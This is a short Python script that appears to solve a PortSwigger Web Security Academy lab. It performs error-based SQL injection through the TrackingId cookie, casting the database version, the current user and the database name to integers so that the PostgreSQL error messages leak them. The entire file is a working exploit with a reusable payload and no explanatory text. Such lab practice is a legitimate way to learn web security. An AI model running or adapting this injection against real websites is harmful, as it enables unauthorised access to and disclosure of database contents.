#!/usr/bin/python3
##
import requests
import re
##
def get_version(URL):
    Payload=f"'+AND+1=CAST(VERSION()+as+int)--+-"
    Send={
            "TrackingId":Payload
        }
    #
    s=requests.Session()
    r=s.get(url=URL,cookies=Send)
    version=str(re.findall("invalid input syntax for type integer:.*\"</h4>",r.text)).split("\"")[1].split("\"")[0]
    s.close()
    return version
#
def get_USER(URL):
    Payload=f"'+AND+1=CAST(USER+as+int)--+-"
    Send={
            "TrackingId":Payload
        }
    #
    s=requests.Session()
    r=s.get(url=URL,cookies=Send)
    user=str(re.findall("invalid input syntax for type integer:.*\"</h4>",r.text)).split("\"")[1].split("\"")[0]
    s.close()
    return user
#
def get_db(URL):
    Payload=f"'+AND+1=CAST(current_database()+as+int)--+-"
    Send={
            "TrackingId":Payload
        }
    #
    s=requests.Session()
    r=s.get(url=URL,cookies=Send)
    db=str(re.findall("invalid input syntax for type integer:.*\"</h4>",r.text)).split("\"")[1].split("\"")[0]
    s.close()
    return db
#

#
def main(URL):
    version=get_version(URL)
    print(f"The version is: {version}")
    User=get_USER(URL)
    print(f"The USER is: {User}")
    db=get_db(URL)
    print(f"The databse is: {db}")
##
main('https://0aac00cc037c881880a9626b00ae006c.web-security-academy.net/')
